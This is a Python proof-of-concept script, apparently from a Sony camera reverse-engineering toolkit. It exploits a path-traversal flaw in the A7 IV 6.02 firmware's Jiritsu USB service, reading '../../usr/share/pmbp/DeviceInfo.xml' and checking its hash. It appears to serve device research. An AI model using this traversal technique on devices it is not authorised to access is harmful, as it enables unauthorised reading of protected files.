#!/usr/bin/env python3
"""Read one fixed A7 IV 6.02 file through the Jiritsu traversal behavior."""

import hashlib
import struct

from pmca.commands.usb import senserShellCommand


JIRITSU_CATEGORY = 0x1001
JIRITSU_SET_FILE_PATH = 0x400F
JIRITSU_GET_FILE2 = 0x4011
FIXED_PATH = b"../../usr/share/pmbp/DeviceInfo.xml"
EXPECTED_SHA256_602 = "e44713178fad970870ead845c93abdfcf150c418de11b306da91f2d09d67c1b7"


def probe(camera):
    camera.readHasp()
    set_response = camera._sendAdjustControlPacket(
        JIRITSU_CATEGORY,
        JIRITSU_SET_FILE_PATH,
        b"\x00" + FIXED_PATH,
    )
    if set_response:
        print(
            "SET_FILE_PATH returned %d byte(s): %s"
            % (len(set_response), set_response.hex())
        )

    response = camera._sendAdjustControlPacket(
        JIRITSU_CATEGORY,
        JIRITSU_GET_FILE2,
        b"\x00\xff\x00",
    )
    if len(response) < 4:
        raise RuntimeError(
            "GET_FILE2 response is shorter than its 4-byte status: %r" % response
        )

    status = struct.unpack_from("<I", response)[0]
    payload = response[4:]
    print("GET_FILE2 inner status: 0x%08x" % status)
    print("Returned file bytes: %d" % len(payload))
    if status:
        print("Raw response: %s" % response.hex())
        return

    digest = hashlib.sha256(payload).hexdigest()
    print("SHA256: %s" % digest)
    print(
        "Matches extracted 6.02 file: %s"
        % ("yes" if digest == EXPECTED_SHA256_602 else "no")
    )
    print(payload.decode("utf-8", errors="replace").rstrip())


if __name__ == "__main__":
    completed = False

    def run(camera):
        global completed
        probe(camera)
        completed = True

    senserShellCommand(complete=run)
    if not completed:
        raise SystemExit("Probe did not run; rerun after the camera reconnects")

